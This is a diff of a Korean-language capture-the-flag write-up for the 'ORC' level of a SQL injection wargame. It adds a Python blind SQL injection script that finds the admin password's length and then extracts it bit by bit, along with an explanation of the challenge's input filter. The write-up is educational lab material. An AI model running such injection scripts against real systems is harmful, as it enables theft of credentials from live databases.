@@ -1,3 +1,4 @@
+
 ## ORC Write-up
 
 ### 문제
@@ -24,26 +25,51 @@
 ``` python
 import requests
 
-url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
-session = {'PHPSESSID':'My PHPSESSID'}
-data = {}
+def req(a) :
+    url = 'http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
+    cookies = {'PHPSESSID' : 'My PHPSESSID'}
+    params = {}
+    params['pw'] = a
 
-flag=""
+    res = requests.get(url, cookies=cookies, params=params)
 
-print("[∞] flag : ",end='')
+    if "Hello admin" in res.text :
+        return True
+    elif "Clear" in res.text :
+        return True
+    else :
+        return False
 
-for i in range(1,9):
-   for j in range(32,127):
-      data['pw']="' or id='admin' and ord(mid(pw,"+str(i)+",1))='"+str(j)+"'#"
-      res = requests.get(url, params=data, cookies=session)
-      if "Hello admin" in res.text:
-         print(chr(j),end='')
-         flag = flag + chr(j)
-         break
+for i in range(100) :
+    a = "' or id='admin' and length(pw)="+str(i)+"#"
+    if req(a) :
+        length = i
+        print("Key length is " + str(i))
+        break
 
-data['pw']=flag
-res = requests.get(url, params=data, cookies=session)
+flag = ''
+for i in range(length) :
+    binary = ''
+    for j in range(8) :
+        a = "' or id='admin' and substr(lpad(bin(ord(substr(pw, "+str(i+1)+", 1))), 8, 0), "+str(j+1)+",1)=0#"
+        if req(a) :
+            binary += '0'
+        else :
+            binary += '1'
+    flag += chr(int(binary, 2))
 
-if "Clear!" in res.text:
-   print("\n[♪] ORC Clear!")
+if req(flag) :
+    print("FLAG IS " + flag)
+    print("\n[♪] ORC Clear")
 ```
+
+이번 문제는 pw가 무엇인지 알아내야 한다.
+``` php
+if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+```
+GET 방식으로 받는 pw를 필터링 하는 구문이다.
+`prob` `_` `.` `(` `)` 중 하나라도 있으면 필터링 된다.
+i는 대소문자 구분없이 단어만 같으면 필터한다는 의미이다.
+
+Exploit 코드는 한 글자를 바이너리로 변환해 비교하는 형식으로 코딩했다.
+admin의 pw 값을 알아내고 문제를 해결했다.
